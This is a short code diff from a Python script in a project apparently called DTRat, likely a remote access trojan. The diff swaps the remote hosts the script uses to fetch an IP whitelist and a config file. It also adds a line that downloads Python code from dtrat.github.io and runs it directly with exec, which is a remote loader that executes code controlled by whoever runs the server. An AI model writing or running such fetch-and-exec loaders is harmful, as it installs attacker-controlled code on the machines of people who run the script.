@@ -14,10 +14,10 @@ while ip == "":
     except:
         print("Connection Error: wait 10sec")
         time.sleep(10)
-white_list = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/whitelist-ip.txt").split("\n")
-inidata = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time()))
+white_list = load("https://dtrat.github.io/dtrat/whitelist-ip.txt?q={}".format(time.time())).split("\n")
+inidata = load("https://dtrat.github.io/dtrat/config.ini?q={}".format(time.time()))
 
-exec(load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)))
+exec(load("https://dtrat.github.io/dtrat/load.py?q={}".format(time.time)))
 
 if ip in white_list:
     print("Whitelist detected!")
